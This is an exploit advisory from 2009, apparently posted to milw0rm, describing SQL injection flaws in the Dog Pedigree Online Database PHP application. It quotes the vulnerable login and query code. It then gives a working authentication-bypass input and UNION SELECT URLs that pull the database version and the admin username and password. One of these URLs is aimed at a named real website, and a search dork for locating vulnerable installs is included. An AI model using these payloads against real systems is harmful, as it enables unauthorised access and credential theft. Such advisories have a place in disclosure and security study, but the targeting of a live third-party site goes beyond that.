@@ -1,0 +1,173 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	     MULTIPLE SQL INJECTION VULNERABILITIES		      	     |
+|--------------------------------------------------------------------------------------------|
+|                       |    Dog Pedigree Online Database v1.0.1-Beta     |		     |
+|  CMS INFORMATION:	 -------------------------------------------------	             |
+|										             |
+|-->WEB: http://thewhippetarchives.net/twa_is_offline.php          	                     |
+|-->DOWNLOAD: http://sourceforge.net/projects/dogarchive          	                     |
+|-->DEMO: N/A   	     			    					     |
+|-->CATEGORY: Genealogy									     |
+|-->DESCRIPTION: This project allows to setup and maintain a database for 	 	     |
+|		collecting (dog) pedigrees. The data will actually be collected...	     |
+|-->RELEASED: 2009-01-25								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3								     |
+|-->DORK: inurl:"printable_pedigree.php"				                     |
+|-->CATEGORY: AUTH-BYPASS / SQL INJECTION (SQLi)		                             |
+|-->AFFECT VERSION: <= 1.0.1 Beta			 			             |
+|-->Discovered Bug date: 2009-05-08							     |
+|-->Reported Bug date: 2009-05-08							     |
+|-->Fixed bug date: 2009-05-12								     |
+|-->Info patch (v1.0.2): http://sourceforge.net/projects/dogarchive/	 		     |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+#####################
+////////////////////
+
+AUTH-BYPASS (SQLi):
+
+////////////////////
+#####################
+
+
+<<<<---------++++++++++++++ Condition-1: magic_quotes_gpc=off +++++++++++++++++--------->>>>
+
+
+-----------
+VULN FILE:
+-----------
+
+
+Path --> [HOME_PATH]/php_users/htdocs/processlogin.php
+Lines --> 69-73
+
+...
+
+  $sql = sprintf("
+   	SELECT userId,status,email,seclev FROM $USERS_DB.users 
+    	WHERE username='%s' AND password='%s'",
+	       $_POST['username'],
+	       md5($_POST['password']));
+...
+
+
+-----------
+EXPLOIT:
+-----------
+
+
+Username='or 1=1#
+Password=nothing
+
+
+
+################
+////////////////
+
+SQL INJECTION:
+
+////////////////
+################
+
+
+This aplication is completely vulnerable to sql injection. I only show an example.
+
+
+-----------
+VULN FILE:
+-----------
+
+
+Path --> [HOME_PATH]/manageperson.php 
+Var --> GET var 'personId'
+Lines --> 28,29
+
+...
+
+if (empty($currId))
+	$currId = $_GET['personId'];
+
+...
+
+
+Lines --> 164-165
+
+...
+
+$query = "SELECT * FROM person WHERE id=$currId";
+$result = mysql_query($query) or die('Query failed: ' . mysql_error());
+$line = mysql_fetch_object($result);	
+
+...
+
+
+------
+PoC:
+------
+
+
+http://[HOST]/[HOME_PATH]/managePerson.php?personId=-1+UNION+ALL+SELECT+1,version(),user(),database(),version(),user(),database(),version(),user(),database(),11,12%23
+
+
+Return --> Database version, user and name.
+
+
+---------
+EXPLOIT:
+---------
+
+
+http://www.gavgavclub.ru/tree/managePerson.php?personId=-1+UNION+ALL+SELECT+1,concat(username,0x3A3A3A,password),user(),database(),version(),user(),database(),version(),user(),database(),11,12+FROM+users+WHERE+userId=2252%23
+
+
+Return --> username:::password
+
+
+**Note: Admin user id is 2252 by default
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-05-19]
